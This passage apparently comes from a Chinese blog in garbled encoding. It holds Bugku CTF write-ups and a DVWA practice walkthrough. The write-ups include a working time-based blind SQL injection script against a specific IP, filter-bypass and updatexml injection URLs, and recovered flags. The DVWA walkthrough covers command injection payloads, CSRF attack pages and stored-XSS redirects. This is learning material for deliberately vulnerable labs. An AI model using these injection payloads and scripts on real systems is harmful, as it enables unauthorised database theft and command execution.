<img src="http://img.kawhi.xyz/image-20200325183817128.png" alt="image-20200325183817128" style="high:80%;width:80%;" />

<p>è¿™é“é¢˜æ˜¯è‡ªå·±åšå‡ºæ¥çš„flagï¼Œè™½ç„¶é¢˜ç›®ç®€å•ï¼Œè¿˜æ˜¯æŒºå¼€å¿ƒçš„ï¼Œç»ˆäºä¸ç”¨çœ‹wpäº†ã€‚</p>
<h5 id="æ±‚getshell"><a href="#æ±‚getshell" class="headerlink" title="æ±‚getshell"></a><strong>æ±‚getshell</strong></h5><p>é¢˜ç›®å¦‚ä¸‹</p>
<img src="http://img.kawhi.xyz/image-20200325203204296.png" alt="image-20200325203204296" style="high:80%;width:80%;" />

<p>ç”¨burpsuiteæŠ“åŒ…åæ”¹è¿™ä¸‰ä¸ªåœ°æ–¹å³å¯å¾—åˆ°flag</p>
<img src="http://img.kawhi.xyz/image-20200325203355071.png" alt="image-20200325203355071" style="high:80%;width:80%;" />

<p>æ²¡æƒ³åˆ°æ˜¯è¿™æ ·å°±å¾—å‡ºflagï¼Œä¸€å¼€å§‹æˆ‘åªæ”¹äº†ä¸‹é¢ä¸¤ä¸ªç®­å¤´ï¼Œè¿˜æ‹¿èœåˆ€åœ¨é‚£é‡Œè¿ä¸ªåŠå¤©ã€‚</p>
<h5 id="INSERT-INTOæ³¨å…¥"><a href="#INSERT-INTOæ³¨å…¥" class="headerlink" title="INSERT INTOæ³¨å…¥"></a><strong>INSERT INTOæ³¨å…¥</strong></h5><img src="http://img.kawhi.xyz/image-20200326201031090.png" alt="image-20200326201031090" style="high:80%;width:80%;" />

<p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç ï¼Œå¹¶ä¸”å‘ŠçŸ¥è¦å†™pythonè„šæœ¬ã€‚</p>
<p>è¿™é‡Œç”¨explodeå‡½æ•°å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é€—å·åˆ†å‰²çš„ã€‚æ‰€ä»¥è¿™é‡Œ</p>
<p>if(expr1,expr2,expr3)è¿™ä¸ªå‡½æ•°å°±ç”¨ä¸äº†äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨è¿™ä¸ªä»£æ›¿ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select case when xxx then xxx <span class="keyword">else</span> xxx end</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶substr(database(),1,1)ç­‰åŒäºsubstr(database() from 1 for 1)</p>
<p><strong>æŸ¥æ•°æ®åº“åï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span></span><br><span class="line">data = <span class="string">&quot;1&#x27; and (select case when (substr(database() from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mystring:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">&#x27;x-forwarded-for&#x27;</span>:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;The final flag:&#x27;</span>+flag</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºçš„ç»“æœæ˜¯web15ã€‚timeoutçš„å€¼å¯ä»¥å¤§ä¸€äº›æ¯”å¦‚4ï¼Œ5ã€‚ç»“æœä¼šæ›´åŠ å‡†ç¡®ã€‚</p>
<p><strong>æŸ¥è¡¨åï¼š</strong></p>
<p>æŠŠä¸Šè¿°ä»£ç database()æ¢æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºçš„ç»“æœæ˜¯clientipflagã€‚</p>
<p><strong>æŸ¥å­—æ®µåï¼š</strong></p>
<p>æŠŠä¸Šè¿°ä»£ç database()æ¢æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯flagã€‚</p>
<p><strong>æŸ¥å†…å®¹ï¼š</strong></p>
<p>æŠŠä¸Šè¿°ä»£ç database()æ¢æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(select flag <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºæ¥çš„ç»“æœæ˜¯cdbf14c9551d5be5612f7bb5d2867853ã€‚</p>
<h5 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a><strong>å¤šæ¬¡</strong></h5><p>é¢˜ç›®çš„urlä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=1</span><br></pre></td></tr></table></figure>

<p>id=5çš„æ—¶å€™ï¼Œé¡µé¢æç¤ºYou can do some SQL injection in here.</p>
<p>è¯´æ˜æ˜¯ä¸€é“æ³¨å…¥é¢˜ã€‚è¿™æ—¶å€™idè¾“å…¥<font color="red">1â€™</font>é¡µé¢æŠ¥é”™ï¼Œç»§ç»­è¾“å…¥<font color="red">1â€™â€“+</font>æ²¡æœ‰æŠ¥é”™ï¼Œå†è¾“å…¥<font color="red">1â€™ and 1=1â€“+</font>å´æŠ¥é”™äº†ï¼Œè¯´æ˜andåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<strong>å¼‚æˆ–æ³¨å…¥</strong>æ¥åˆ¤æ–­è¿‡æ»¤äº†ä»€ä¹ˆå­—ç¬¦ã€‚</p>
<p>åœ¨id=1åé¢è¾“å…¥<font color="red">â€˜^(0)^â€™</font></p>
<p>å¦‚æœæ‹¬å·é‡Œé¢ä¸º0çš„è¯ï¼Œæ•´ä½“ä¸º1ï¼Œé¡µé¢æ˜¾ç¤ºæ­£ç¡®ã€‚æ‹¬å·é‡Œé¢ä¸º1ï¼Œæ•´ä½“ä¸º0ï¼Œé¡µé¢æ˜¾ç¤ºé”™è¯¯ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;^(length(&#x27;and&#x27;)!=0)^&#x27;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¾“å…¥ä¸Šé¢çš„å­—ç¬¦ï¼Œè€Œé¡µé¢æ˜¾ç¤ºæ­£ç¡®çš„è¯ï¼Œå°±è¯´æ˜andè¢«è¿‡æ»¤äº†ã€‚</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°union,select,or,andéƒ½è¢«è¿‡æ»¤äº†ã€‚fromæ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p>
<p>è¿™æ—¶å€™å°±å¯ä»¥æ„é€ urlæŸ¥æ•°æ®åº“ï¼ŒæŸ¥è¡¨ï¼ŒæŸ¥å­—æ®µï¼ŒæŸ¥å†…å®¹äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,database()--+</span><br><span class="line"><span class="comment">#web1002-1</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;web1002-1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,hint</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;--+</span><br><span class="line"><span class="comment">#flag1,address</span></span><br><span class="line"></span><br><span class="line">http://123.206.87.240:9004/1ndex.php?id=-1&#x27; uunionnion sselectelect 1,select flag1 from flag1--+</span><br><span class="line"><span class="comment">#usOwycTju+FTUUzXosjr</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥addressçš„æ—¶å€™å‘ä¸‹è¿˜æœ‰ä¸‹ä¸€å…³ã€‚</p>
<p>ç„¶åå‘ç°union,sleep,substrè¢«è¿‡æ»¤ï¼Œselect,or,and,fromæ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p>
<p>ä½†æ˜¯åŒå†™æ— æ³•ç»•è¿‡ï¼Œå¤§å°å†™æ— æ³•ç»•è¿‡ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨updatexmlæŠ¥é”™æ³¨å…¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"><span class="comment">#web1002-2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;web1002-2&#x27;  limit 1),0x7e),1)--+</span><br><span class="line"><span class="comment">#class,flag2</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag2&#x27; ),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag2,address</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag&#123;Bugku-sql_6s-2i-4t-bug&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><strong>flag.php</strong></h5><img src="http://img.kawhi.xyz/image-20200331150635411.png" alt="image-20200331150635411" style="high:80%;width:80%;" />

<p>æ‰“å¼€å‘ç°å¦‚ä¸Šï¼š</p>
<p>åº•ä¸‹è¿˜æœ‰ä¸€æ®µï¼š</p>
<img src="http://img.kawhi.xyz/image-20200331150809369.png" alt="image-20200331150809369" style="high:80%;width:80%;" />

<p>åº”è¯¥è¿·æƒ‘çš„ï¼ŒKEYçš„å€¼æ˜¯0ã€‚ä¸Šé¢å¹¶æ²¡æœ‰å®šä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">print_r(serialize(<span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:0:&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>æœ€åä¼ å‚cookieå³å¯ï¼šISecer=s:0:â€â€</p>
]]></content>
      <categories>
        <category>åˆ·é¢˜</category>
      </categories>
  </entry>
  <entry>
    <title>DVWAç»ƒä¹ â… </title>
    <url>/2020/03/14/DVWA%E7%BB%83%E4%B9%A0%E2%85%A0/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h5><p>DVWAæ˜¯ä¸€æ¬¾å¼€æºçš„æ¸—é€æµ‹è¯•æ¼æ´ç»ƒä¹ å¹³å°,åˆ†åˆ«æœ‰ä¸åŒçš„ç»ƒä¹ æ¿å—ï¼Œå¦‚æš´åŠ›ç ´è§£ï¼ŒCSRFï¼Œæ–‡ä»¶åŒ…å«å’Œä¸Šä¼ æ¼æ´ï¼Œä»¥åŠSQLæ³¨å…¥æ¼æ´ï¼ŒXSSç­‰ç­‰ã€‚è¿˜åˆ†åˆ«æœ‰ä½ä¸­é«˜éš¾åº¦å¯ä»¥é€‰æ‹©ã€‚</p>
<h5 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a><strong>æš´åŠ›ç ´è§£</strong></h5><h6 id="lowç­‰çº§"><a href="#lowç­‰çº§" class="headerlink" title="lowç­‰çº§"></a>lowç­‰çº§</h6><p>ç•Œé¢å¦‚ä¸‹ï¼Œæ˜¯ä¸€ä¸ªè¾“å…¥ç”¨æˆ·åå’Œå¯†ç çš„æ–‡æœ¬æ¡†</p>
<img src="http://img.kawhi.xyz/image-20200314104652827.png" alt="image-20200314104652827" style="high:80%;width:80%;" />

<p>è¿™é‡Œç›´æ¥ç”¨burp suiteå»ç ´è§£ä»–çš„å¯†ç ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200314104812871.png" alt="image-20200314104652871" style="high:80%;width:80%;" />

<p>è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314105302160.png" alt="image-20200314105302160" style="high:80%;width:80%;" />

<p>å‘ç°æ²¡æœ‰ä»»ä½•é˜²æ­¢çˆ†ç ´çš„æœºåˆ¶</p>
<p>è€Œä¸”å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¹Ÿå¯ä»¥è¾“å…¥adminâ€™#å³å¯æˆåŠŸç™»å½•</p>
<img src="http://img.kawhi.xyz/image-20200314110629085.png" alt="image-20200314110629085" style="high:80%;width:80%;" />

<h6 id="Mediumç­‰çº§"><a href="#Mediumç­‰çº§" class="headerlink" title="Mediumç­‰çº§"></a>Mediumç­‰çº§</h6><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314110942887.png" alt="image-20200314110942887" style="high:80%;width:80%;" />

<blockquote>
<p>å‘ç°æ¯”lowç­‰çº§å¤šäº†ä¸¤è¡Œï¼Œç®­å¤´æ‰€ç¤º</p>
<p>è¿™ä¸ªå‡½æ•°åŸºæœ¬é˜²æ­¢äº†SQLçš„æ³¨å…¥</p>
<p>mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦</p>
<p>ä½†æ˜¯ä¾ç„¶æ²¡æœ‰åŠ å…¥æœ‰æ•ˆçš„é˜²çˆ†ç ´ï¼Œçˆ†ç ´æ–¹å¼å’Œlowç­‰çº§ä¸€æ ·</p>
</blockquote>
<h6 id="Highç­‰çº§"><a href="#Highç­‰çº§" class="headerlink" title="Highç­‰çº§"></a>Highç­‰çº§</h6><p>é€šè¿‡æŠ“åŒ…å¯ä»¥å‘ç°ç™»å½•çš„æ—¶å€™æäº¤äº†å››ä¸ªå‚æ•°</p>
<img src="http://img.kawhi.xyz/image-20200314111842212.png" alt="image-20200314111842212" style="high:80%;width:80%;" />

<blockquote>
<p>è¿™æ ·å°±è¦æ±‚æˆ‘ä»¬å‘é€çš„æ¯ä¸ªè¯·æ±‚åŒ…ä¸­åŒ…å«éšæœºç”Ÿæˆçš„tokenå€¼ã€‚æˆ‘ä»¬æ— æ³•ç®€å•çš„ä½¿ç”¨Burpsuiteå®Œæˆ</p>
<p>çœ‹ç½‘ä¸Šè¯´å¯ä»¥ç”¨pythonè„šæœ¬æŠ“å–æ¯æ¬¡è¿”å›çš„user_tokenï¼Œè¿™é‡Œæˆ‘æ²¡å»è¯•äº†ï¼Œå®åŠ›åŠé€€</p>
</blockquote>
<h6 id="Impossibleç­‰çº§"><a href="#Impossibleç­‰çº§" class="headerlink" title="Impossibleç­‰çº§"></a>Impossibleç­‰çº§</h6><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314112505889.png" alt="image-20200314112505889" style="high:80%;width:80%;" />

<blockquote>
<p>å¯ä»¥çœ‹åˆ°Impossibleçº§åˆ«çš„ä»£ç åŠ å…¥äº†å¯é çš„é˜²çˆ†ç ´æœºåˆ¶</p>
<p>ä¸€æ—¦é”™è¯¯æ¬¡æ•°è¾¾åˆ°3æ¬¡ï¼Œå°±ä¼šé”å®šç”¨æˆ·15ç§’</p>
</blockquote>
<h5 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a><strong>å‘½ä»¤æ³¨å…¥</strong></h5><h6 id="lowç­‰çº§-1"><a href="#lowç­‰çº§-1" class="headerlink" title="lowç­‰çº§"></a>lowç­‰çº§</h6><img src="http://img.kawhi.xyz/image-20200314112821092.png" alt="image-20200314112821092" style="high:80%;width:80%;" />

<p>è¿™é‡Œæˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸‹127.0.0.1&amp;&amp;ipconfig</p>
<img src="http://img.kawhi.xyz/image-20200314114952634.png" alt="image-20200314114952634" style="high:80%;width:80%;" />

<p>å¯ä»¥å‘ç°lowç­‰çº§å¯¹ipçš„å‚æ•°æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤</p>
<h6 id="Mediumç­‰çº§-1"><a href="#Mediumç­‰çº§-1" class="headerlink" title="Mediumç­‰çº§"></a>Mediumç­‰çº§</h6><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314115219862.png" alt="image-20200314115219862" style="high:80%;width:80%;" />

<blockquote>
<p>å‘ç°ç›¸æ¯”äºLowç­‰çº§çš„ä»£ç ï¼ŒæœåŠ¡å™¨ç«¯å¯¹ipå‚æ•°åšäº†ä¸€å®šè¿‡æ»¤ï¼ŒæŠŠâ€&amp;&amp;â€ ã€â€ï¼›â€æ›¿æ¢ä¸ºç©ºï¼›æœ¬è´¨ä¸Šæ˜¯æ·»åŠ äº†é»‘åå•æœºåˆ¶ï¼Œä¾æ—§å­˜åœ¨å®‰å…¨é—®é¢˜ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨&amp;æˆ–è€…|ï¼Œæˆ–è€…ç”¨ç»•è¿‡çš„æ–¹å¼å¦‚&amp;;&amp;</p>
</blockquote>
<h6 id="Highç­‰çº§-1"><a href="#Highç­‰çº§-1" class="headerlink" title="Highç­‰çº§"></a>Highç­‰çº§</h6><p>æŸ¥çœ‹ä¸€ä¸‹æºä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200314120028803.png" alt="image-20200314120028803" style="high:80%;width:80%;" />

<blockquote>
<p>å‘ç°è¿‡æ»¤äº†å¦‚ä¸Šçš„å­—ç¬¦ï¼Œä½†æ˜¯ç®­å¤´æ‰€ç¤ºçš„åœ°æ–¹æ˜¯å°†â€œ| â€æ›¿æ¢ä¸ºç©ºï¼Œå¹¶ä¸æ˜¯â€œ|â€ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥è¾“å…¥127.0.0.1|ipconfigå³å¯</p>
</blockquote>
<h6 id="Impossibleç­‰çº§-1"><a href="#Impossibleç­‰çº§-1" class="headerlink" title="Impossibleç­‰çº§"></a>Impossibleç­‰çº§</h6><img src="http://img.kawhi.xyz/image-20200314120450931.png" alt="image-20200314120450931" style="high:80%;width:80%;" />

<blockquote>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸ä»…åŠ å…¥äº†token,è€Œä¸”åŒæ—¶å¯¹å‚æ•°ipè¿›è¡Œäº†é™åˆ¶ï¼Œåªæœ‰æ•°å­—æ‰å¯æ‰§è¡Œï¼Œå½»åº•æœç»äº†å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
</blockquote>
<h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h5><blockquote>
<p>csrfæŒ‡çš„æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…æœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieï¼Œä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä»¥å—å®³è€…çš„èº«ä»½å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œå®Œæˆéæ³•æ“ä½œã€‚</p>
<p>åŸºæœ¬çš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<p>â‘ ç”¨æˆ·é¦–å…ˆç™»å½•æœåŠ¡å™¨<br>â‘¡æœåŠ¡å™¨è¿”å›cookie<br>â‘¢ç„¶åæ”»å‡»è€…å°†ä¿®æ”¹ç”¨æˆ·å¯†ç çš„URLå‘ç»™ç”¨æˆ·<br>â‘£ç”¨æˆ·å¦‚æœç‚¹å‡»äº†è¯¥URLï¼Œåˆ™å¯†ç å°±ä¼šè¢«æ›´æ”¹<br>â‘¤æœ€åï¼Œæ”»å‡»è€…ä½¿ç”¨ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç å°è¯•è¿›è¡Œç™»å½•æœåŠ¡å™¨ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¯æ˜ç”¨æˆ·ç‚¹è¿‡urlï¼Œå¦‚æœæ²¡æœ‰ç™»å½•æˆåŠŸï¼Œåˆ™ç”¨æˆ·æ²¡æœ‰ç‚¹å‡»urlã€‚</p>
</blockquote>
<h6 id="lowç­‰çº§-2"><a href="#lowç­‰çº§-2" class="headerlink" title="lowç­‰çº§"></a>lowç­‰çº§</h6><p>æŸ¥çœ‹ä»–çš„æºç </p>
<img src="http://img.kawhi.xyz/image-20200314122002750.png" alt="image-20200314122002750" style="high:80%;width:80%;" />

<blockquote>
<p>å‘ç°ç”¨äº†ä¸Šé¢æš´åŠ›ç ´è§£çš„å‡½æ•°ï¼Œå³è¿‡æ»¤äº†SQLçš„ç‰¹æ®Šå­—ç¬¦</p>
<p>ä½†æ˜¯å¹¶æ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶</p>
</blockquote>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨å‡ ç§ä¸åŒçš„æ–¹å¼è¿›è¡Œä¼ªé€ </p>
<p><strong>æ–¹å¼ä¸€ï¼šæ„é€ ä¿®æ”¹å¯†ç çš„é“¾æ¥</strong></p>
<p>è¿™é‡ŒæŠ“åŒ…è¯•ä¸€ä¸‹ï¼Œå¹¶ä¿®æ”¹é“¾æ¥åé‡æ–°å‘åŒ…</p>
<img src="http://img.kawhi.xyz/image-20200314123419806.png" alt="image-20200314123419806" style="high:80%;width:80%;" />

<blockquote>
<p>æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼šè¿™ä¸ªé“¾æ¥ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥è¿™ä¸ªé“¾æ¥æ˜¯æ”¹å¯†ç çš„ï¼Œè€Œä¸”åœ¨ç‚¹å‡»äº†è¿™ä¸ªé“¾æ¥åï¼Œé¡µé¢å°±ä¼šæ˜¾ç¤ºå¯†ç å·²ä¿®æ”¹ã€‚æ˜¾ç„¶ä¸å¤ªå¥½</p>
</blockquote>
<p><strong>æ–¹å¼äºŒï¼šæ„é€ æ”»å‡»é¡µé¢</strong></p>
<img src="http://img.kawhi.xyz/image-20200314124625220.png" alt="image-20200314124625220" style="high:80%;width:80%;" />

<blockquote>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨æœ¬åœ°å†™ä¸€ä¸ª1.htmlï¼Œç„¶åè¯±å¯¼å—å®³è€…å»ç‚¹å‡»ï¼Œç‚¹å‡»ä¹‹åå°±ç›´æ¥ä¿®æ”¹å¯†ç ä¸º4444ï¼Œè€Œä¸”æ˜¯ä»¥imgçš„æ–¹å¼ï¼Œæ˜¾ç„¶è¿™ç§æ–¹æ³•æ¯”ç¬¬ä¸€ç§æ›´åŠ éšè”½ã€‚</p>
</blockquote>
<p><strong>æ–¹å¼ä¸‰ï¼šç»“åˆå­˜å‚¨å‹XSSè¿›è¡Œé‡å®šå‘</strong></p>
<img src="http://img.kawhi.xyz/image-20200314125648840.png" alt="image-20200314125648840" style="high:80%;width:80%;" />

<blockquote>
<p>å› ä¸ºæ˜¯å­˜å‚¨å‹xssï¼Œæ‰€ä»¥å†™å…¥ä¹‹åæ¯æ¬¡è®¿é—®xsséƒ½ä¼šç›´æ¥é‡å®šå‘1.htmlé¡µé¢</p>
<p>ç»“æœä¹Ÿå‘ç°å¯†ç æˆåŠŸä¿®æ”¹</p>
</blockquote>
<h6 id="Mediumç­‰çº§-2"><a href="#Mediumç­‰çº§-2" class="headerlink" title="Mediumç­‰çº§"></a>Mediumç­‰çº§</h6><p>æŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314141947325.png" alt="image-20200314141947325" style="high:80%;width:80%;" />

<blockquote>
<p>Mediumçº§åˆ«çš„ä»£ç ä½¿ç”¨ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°ï¼Œå³è¦æ±‚æœ¬åœ°ç™»å½•ï¼‰ï¼Œå¸Œæœ›é€šè¿‡è¿™ç§æœºåˆ¶æŠµå¾¡CSRFæ”»å‡»ã€‚</p>
</blockquote>
<p>å¦‚æœä½¿ç”¨ä¸Šé¢çš„æ–¹å¼äºŒæˆ–è€…ä¸‰å°±ä¼šå¤±æ•ˆï¼Œè¿™é‡Œå¯ä»¥æŠŠ1.htmlå†æ”¾è¿›åŒ…å«æœ¬åœ°ipåœ°å€çš„æ–‡ä»¶å¤¹ä¸­å³å¯</p>
<img src="http://img.kawhi.xyz/image-20200314143922825.png" alt="image-20200314143922825" style="high:80%;width:80%;" />

<h6 id="Highç­‰çº§-2"><a href="#Highç­‰çº§-2" class="headerlink" title="Highç­‰çº§"></a>Highç­‰çº§</h6><p>æŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314164900286.png" alt="image-20200314164900286" style="high:80%;width:80%;" />

<blockquote>
<p>å‘ç°åŠ å…¥äº†Anti-CSRF tokenæœºåˆ¶ã€‚è¿™é‡Œå®åŠ›åŠé€€</p>
</blockquote>
<h6 id="Impossibleç­‰çº§-2"><a href="#Impossibleç­‰çº§-2" class="headerlink" title="Impossibleç­‰çº§"></a>Impossibleç­‰çº§</h6><img src="http://img.kawhi.xyz/image-20200314165136975.png" alt="image-20200314165136975" style="high:80%;width:80%;" />

<blockquote>
<p>è¿™é‡Œè¦æ±‚è¾“å…¥åŸå§‹çš„å¯†ç ï¼Œæœ‰æ•ˆçš„é˜²æ­¢äº†CSRF</p>
</blockquote>
<h5 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a><strong>æ–‡ä»¶åŒ…å«</strong></h5><ul>
<li>æ–‡ä»¶åŒ…å«çš„å®šä¹‰</li>
</ul>
<blockquote>
<p>å¼€å‘äººå‘˜å°†ç›¸åŒçš„å‡½æ•°å†™å…¥å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨æŸä¸ªå‡½æ•°æ—¶ç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§æ–‡ä»¶è°ƒç”¨çš„è¿‡ç¨‹ç§°æ–‡ä»¶åŒ…å«</p>
</blockquote>
<ul>
<li>æ–‡ä»¶åŒ…å«æ¼æ´</li>
</ul>
<blockquote>
<p>å¼€å‘äººå‘˜ä¸ºäº†ä½¿ä»£ç æ›´çµæ´»ï¼Œä¼šå°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æ¶æ„è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´</p>
</blockquote>
<ul>
